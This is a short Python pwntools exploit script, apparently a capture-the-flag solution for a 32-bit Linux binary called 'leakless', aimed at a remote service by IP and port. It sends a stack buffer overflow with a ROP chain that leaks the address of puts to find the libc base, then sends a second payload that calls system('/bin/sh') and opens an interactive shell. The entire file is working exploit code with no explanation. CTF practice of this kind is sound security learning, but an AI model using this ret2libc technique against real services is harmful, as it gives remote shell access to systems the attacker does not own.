#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# Author = nepire
from pwn import*
context(os='linux',arch='i386',log_level='debug')
# n = process('./leakless')
n = remote('35.243.188.20',2002)
elf = ELF('./leakless')
libc = ELF('./libc.so')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_ret = 0x080483ad
feedme = 0x080485cb

payload = 'a'*0x48+'aaaa'+p32(puts_plt)+p32(pop_ret)+p32(puts_got)+p32(feedme)
# n.recv()
n.sendline(payload)

libc_base = u32(n.recv(4))-libc.sym['puts']
print "libc_base:",hex(libc_base)

payload = 'a'*0x4c + p32(libc_base + libc.sym['system'])+'aaaa'+p32(libc_base+libc.search('/bin/sh').next())
n.sendline(payload)

n.interactive()
